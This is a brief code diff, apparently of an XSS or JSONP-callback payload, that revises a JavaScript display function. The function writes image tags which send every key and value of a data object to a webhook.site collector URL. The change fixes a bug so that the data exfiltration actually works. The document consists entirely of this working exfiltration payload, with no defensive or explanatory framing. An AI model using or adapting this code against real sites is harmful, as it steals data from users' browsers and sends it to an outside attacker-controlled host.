@@ -3,9 +3,8 @@
 <script>
 function display(data) {
   for (var key in data){
-    var all = key+":"+data[key];
-	var url = "https://webhook.site/c58329bc-8c58-4bcb-b1d3-d081842af9d3" + "/?got=" + all;    
-	document.write("<img src=url>");
+    var all = key+':'+data[key];   
+	document.write("<img src='https://webhook.site/c58329bc-8c58-4bcb-b1d3-d081842af9d3/?got=" + all + "'/>");
   }
 
 }
